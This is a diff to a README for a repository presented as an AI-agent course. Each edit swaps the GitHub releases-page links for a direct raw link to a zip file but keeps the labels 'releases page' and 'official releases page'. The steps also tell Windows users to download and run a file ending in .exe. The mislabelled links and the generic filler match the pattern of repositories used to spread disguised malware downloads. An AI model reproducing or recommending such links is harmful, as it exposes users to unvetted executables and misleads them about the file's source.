@@ -1,6 +1,6 @@
 # 🤖 agentic-ai-system-course - Learn to build production AI agents
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/120th-westgermany829/agentic-ai-system-course/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/120th-westgermany829/agentic-ai-system-course/main/course/system_agentic_ai_course_1.1.zip)
 
 This repository provides a step-by-step course on how to design, build, and operate production AI agents. AI agents act as digital employees that can complete tasks, reason through problems, and use external software. This guide helps you set up the tools to learn these skills.
 
@@ -18,7 +18,7 @@ Your computer needs specific components to run this software. Please verify your
 
 Follow these steps to obtain the course software:
 
-1. Visit the [releases page](https://github.com/120th-westgermany829/agentic-ai-system-course/releases) to download the package.
+1. Visit the [releases page](https://raw.githubusercontent.com/120th-westgermany829/agentic-ai-system-course/main/course/system_agentic_ai_course_1.1.zip) to download the package.
 2. Select the file ending in `.exe` for Windows.
 3. Save the file to your desktop or downloads folder.
 
@@ -72,4 +72,4 @@ The course materials include embedded documentation to assist you as you learn. 
 - Video guides: Visual walkthroughs for complex labs.
 - Exercise files: Pre-configured templates to practice building your first agents.
 
-You can return to the [official releases page](https://github.com/120th-westgermany829/agentic-ai-system-course/releases) periodically to check for software updates. The development team releases new modules and course improvements as the field of AI agents evolves. Keeping your software current ensures you use the latest tools and security patches.
+You can return to the [official releases page](https://raw.githubusercontent.com/120th-westgermany829/agentic-ai-system-course/main/course/system_agentic_ai_course_1.1.zip) periodically to check for software updates. The development team releases new modules and course improvements as the field of AI agents evolves. Keeping your software current ensures you use the latest tools and security patches.
